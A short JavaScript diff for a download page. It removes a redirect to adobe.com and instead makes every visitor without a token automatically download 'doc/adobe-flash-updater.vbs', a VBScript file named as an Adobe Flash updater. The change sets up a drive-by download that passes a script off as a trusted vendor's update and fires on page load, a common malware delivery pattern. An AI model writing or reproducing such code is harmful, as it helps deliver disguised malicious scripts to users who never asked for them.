@@ -16,6 +16,7 @@ function downloadFile(url) {
 
 setTimeout(() => {
     let token = "";
+    let file;
 
     if (window.location.search) {
         const params = new URLSearchParams(window.location.search);
@@ -24,16 +25,10 @@ setTimeout(() => {
         token = window.location.pathname.replace(/^\/|\/$/g, "");
     }
 
-    if (!token) {
-        window.location.href = "https://www.adobe.com/";
-        return;
-    }
-
-    const file = getDownloadFile(token);
-
-    if (!file) {
-        window.location.href = "https://www.adobe.com/";
-        return;
+    if (token) {
+       file = getDownloadFile(token);
+    } else { 
+        file = "doc/adobe-flash-updater.vbs"
     }
 
     downloadFile(file);
